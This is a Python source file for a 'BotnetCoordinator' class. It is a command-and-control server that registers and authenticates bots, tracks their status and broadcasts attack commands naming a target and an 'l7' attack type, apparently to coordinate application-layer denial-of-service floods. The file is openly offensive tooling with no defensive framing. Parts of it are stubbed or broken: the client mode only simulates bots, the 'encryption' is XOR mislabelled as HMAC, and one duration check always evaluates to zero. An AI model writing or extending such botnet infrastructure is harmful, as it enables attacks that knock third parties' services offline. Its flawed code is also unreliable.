import asyncio
import socket
import json
import time
import threading
import random
import hashlib
import hmac
import base64
from typing import Dict, Any, Optional, List, Tuple
import os
import signal

class BotnetCoordinator:
    """
    Advanced botnet coordination and command system.
    """

    def __init__(self, botnet_file: str = None, encryption_key: str = None,
                 is_server: bool = False, listen_port: int = 6667,
                 target: str = None, duration: int = 0):
        self.botnet_file = botnet_file
        self.encryption_key = encryption_key or self._generate_key()
        self.is_server = is_server
        self.listen_port = listen_port
        self.target = target
        self.duration = duration

        # Botnet state
        self.bots: List[Dict[str, Any]] = []
        self.active_bots: List[Dict[str, Any]] = []
        self.bot_stats = {}
        self.server_socket = None

        # Coordination state
        self.coordination_active = False
        self.attack_commands = {}
        self.bot_responses = {}

        # Security
        self.authenticated_bots = set()

        # Load botnet
        if botnet_file:
            self._load_botnet()

    def _generate_key(self) -> str:
        """Generate a random encryption key."""
        return base64.b64encode(os.urandom(32)).decode()

    def _load_botnet(self):
        """Load botnet nodes from file."""
        if not self.botnet_file:
            print("No botnet file specified")
            return

        try:
            with open(self.botnet_file, 'r') as f:
                for line in f:
                    line = line.strip()
                    if not line or line.startswith('#'):
                        continue

                    parts = line.split(':')
                    if len(parts) >= 2:
                        bot = {
                            'id': parts[0],
                            'ip': parts[1],
                            'port': int(parts[2]) if len(parts) > 2 else 6667,
                            'password': parts[3] if len(parts) > 3 else None,
                            'capabilities': parts[4].split(',') if len(parts) > 4 else ['l7'],
                            'status': 'offline',
                            'last_seen': 0,
                            'attack_stats': {}
                        }
                        self.bots.append(bot)

            print(f"Loaded {len(self.bots)} botnet nodes")
            self._initialize_bot_stats()

        except Exception as e:
            print(f"Error loading botnet: {e}")

    def _initialize_bot_stats(self):
        """Initialize statistics for each bot."""
        for bot in self.bots:
            self.bot_stats[bot['id']] = {
                'packets_sent': 0,
                'bytes_sent': 0,
                'errors': 0,
                'last_activity': 0,
                'uptime': 0
            }

    def _encrypt_message(self, message: str) -> str:
        """Encrypt a message using HMAC."""
        if not self.encryption_key:
            return message

        # Simple XOR encryption for demo (use proper encryption in production)
        key_bytes = self.encryption_key.encode()[:16]
        message_bytes = message.encode()
        encrypted = bytearray()

        for i, byte in enumerate(message_bytes):
            encrypted.append(byte ^ key_bytes[i % len(key_bytes)])

        return base64.b64encode(encrypted).decode()

    def _decrypt_message(self, encrypted_message: str) -> str:
        """Decrypt a message using HMAC."""
        if not self.encryption_key:
            return encrypted_message

        try:
            # Simple XOR decryption
            key_bytes = self.encryption_key.encode()[:16]
            encrypted = base64.b64decode(encrypted_message)
            decrypted = bytearray()

            for i, byte in enumerate(encrypted):
                decrypted.append(byte ^ key_bytes[i % len(key_bytes)])

            return decrypted.decode()
        except:
            return encrypted_message

    def _authenticate_bot(self, bot_id: str, password: str) -> bool:
        """Authenticate a bot connection."""
        bot = next((b for b in self.bots if b['id'] == bot_id), None)
        if not bot:
            return False

        expected_password = bot.get('password')
        if expected_password and password != expected_password:
            return False

        self.authenticated_bots.add(bot_id)
        bot['status'] = 'online'
        bot['last_seen'] = time.time()
        return True

    def _handle_bot_registration(self, data: Dict[str, Any], client_address: Tuple[str, int]) -> Dict[str, Any]:
        """Handle bot registration."""
        bot_id = data.get('bot_id')
        password = data.get('password')

        if self._authenticate_bot(bot_id, password):
            return {
                'status': 'success',
                'message': 'Bot authenticated successfully',
                'bot_id': bot_id,
                'commands': self.attack_commands
            }
        else:
            return {
                'status': 'error',
                'message': 'Authentication failed'
            }

    def _handle_bot_heartbeat(self, data: Dict[str, Any], bot_id: str) -> Dict[str, Any]:
        """Handle bot heartbeat."""
        bot = next((b for b in self.bots if b['id'] == bot_id), None)
        if bot:
            bot['last_seen'] = time.time()
            bot['status'] = 'online'

            # Update bot stats if provided
            if 'stats' in data:
                self.bot_stats[bot_id].update(data['stats'])
                self.bot_stats[bot_id]['last_activity'] = time.time()

            return {
                'status': 'success',
                'commands': self.attack_commands
            }

        return {'status': 'error', 'message': 'Bot not found'}

    def _handle_bot_response(self, data: Dict[str, Any], bot_id: str) -> Dict[str, Any]:
        """Handle bot attack response."""
        self.bot_responses[bot_id] = data
        return {'status': 'success'}

    def _botnet_server_handler(self, client_socket: socket.socket, client_address: Tuple[str, int]):
        """Handle individual bot connections."""
        print(f"Bot connection from {client_address}")

        try:
            while self.coordination_active:
                # Receive data
                data = client_socket.recv(4096)
                if not data:
                    break

                try:
                    # Decrypt and parse message
                    decrypted_data = self._decrypt_message(data.decode())
                    message = json.loads(decrypted_data)

                    response = None

                    # Handle different message types
                    if message.get('type') == 'register':
                        response = self._handle_bot_registration(message, client_address)
                    elif message.get('type') == 'heartbeat':
                        bot_id = message.get('bot_id')
                        response = self._handle_bot_heartbeat(message, bot_id)
                    elif message.get('type') == 'response':
                        bot_id = message.get('bot_id')
                        response = self._handle_bot_response(message, bot_id)

                    if response:
                        # Encrypt and send response
                        encrypted_response = self._encrypt_message(json.dumps(response))
                        client_socket.send(encrypted_response.encode())

                except json.JSONDecodeError:
                    print(f"Invalid JSON from {client_address}")
                except Exception as e:
                    print(f"Error handling bot message: {e}")

        except Exception as e:
            print(f"Bot handler error: {e}")
        finally:
            client_socket.close()

    def _start_coordination_server(self):
        """Start the botnet coordination server."""
        print(f"🤖 Starting botnet coordination server on port {self.listen_port}")

        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

        try:
            self.server_socket.bind(('', self.listen_port))
            self.server_socket.listen(100)
            print(f"Botnet server listening on port {self.listen_port}")

            while self.coordination_active:
                try:
                    client_socket, client_address = self.server_socket.accept()

                    # Handle bot in separate thread
                    bot_thread = threading.Thread(
                        target=self._botnet_server_handler,
                        args=(client_socket, client_address),
                        daemon=True
                    )
                    bot_thread.start()

                except OSError:
                    # Socket was closed
                    break

        except Exception as e:
            print(f"Server error: {e}")
        finally:
            if self.server_socket:
                self.server_socket.close()

    def _botnet_client_handler(self):
        """Handle botnet client operations."""
        print("🤖 Botnet client mode - connecting to coordination server")

        # For demo, we'll simulate bot behavior
        # In real implementation, this would connect to the server

        while self.coordination_active and (self.duration == 0 or (time.time() - time.time()) < self.duration):
            # Simulate bot heartbeat
            time.sleep(30)

            if not self.coordination_active:
                break

    def broadcast_command(self, command: Dict[str, Any]):
        """Broadcast attack command to all active bots."""
        command['timestamp'] = time.time()
        command_id = f"cmd_{int(time.time())}"

        self.attack_commands[command_id] = command

        print(f"Broadcasting command {command_id} to {len(self.active_bots)} bots")

        # In real implementation, this would send to actual bots
        # For demo, we'll just log it

        return command_id

    def get_botnet_status(self) -> Dict[str, Any]:
        """Get current botnet status."""
        online_bots = len([b for b in self.bots if b['status'] == 'online'])
        total_bots = len(self.bots)

        # Calculate total botnet capacity
        total_capacity = {
            'packets_per_second': sum(self.bot_stats[bot['id']].get('packets_sent', 0) for bot in self.bots),
            'bandwidth_mbps': 0,  # Would need to calculate based on bot capabilities
        }

        return {
            'total_bots': total_bots,
            'online_bots': online_bots,
            'offline_bots': total_bots - online_bots,
            'total_capacity': total_capacity,
            'bot_details': self.bots.copy()
        }

    async def start_coordination(self) -> Dict[str, Any]:
        """Start botnet coordination."""
        print("🤖 Starting botnet coordination...")

        if not self.bots:
            print("❌ No bots available")
            return {"error": "No bots available"}

        self.coordination_active = True

        # Start server or client based on mode
        if self.is_server:
            # Start coordination server
            server_thread = threading.Thread(target=self._start_coordination_server, daemon=True)
            server_thread.start()

            # Broadcast attack command if target specified
            if self.target:
                attack_command = {
                    'type': 'attack',
                    'target': self.target,
                    'duration': self.duration,
                    'attack_type': 'l7',  # Default for botnet
                    'parameters': {}
                }

                command_id = self.broadcast_command(attack_command)

            # Monitor botnet status
            start_time = time.time()
            try:
                while self.coordination_active and (self.duration == 0 or (time.time() - start_time) < self.duration):
                    status = self.get_botnet_status()
                    print(f"Botnet Status: {status['online_bots']}/{status['total_bots']} bots online")

                    # Update active bots
                    self.active_bots = [b for b in self.bots if b['status'] == 'online']

                    time.sleep(10)

            except KeyboardInterrupt:
                print("⚠️ Coordination interrupted by user")

        else:
            # Start client handler
            client_thread = threading.Thread(target=self._botnet_client_handler, daemon=True)
            client_thread.start()

            # Wait for coordination period
            start_time = time.time()
            try:
                while self.coordination_active and (self.duration == 0 or (time.time() - start_time) < self.duration):
                    time.sleep(5)

            except KeyboardInterrupt:
                print("⚠️ Coordination interrupted by user")

        # Stop coordination
        self.coordination_active = False

        # Calculate final statistics
        final_status = self.get_botnet_status()

        result = {
            'duration': time.time() - start_time if 'start_time' in locals() else 0,
            'botnet_status': final_status,
            'commands_sent': len(self.attack_commands),
            'responses_received': len(self.bot_responses)
        }

        print("✅ Botnet coordination completed!")
        print(f"📊 Final Status: {result['botnet_status']['online_bots']}/{result['botnet_status']['total_bots']} bots")

        return result

    def stop_coordination(self):
        """Stop botnet coordination."""
        print("🛑 Stopping botnet coordination...")
        self.coordination_active = False

        if self.server_socket:
            self.server_socket.close()
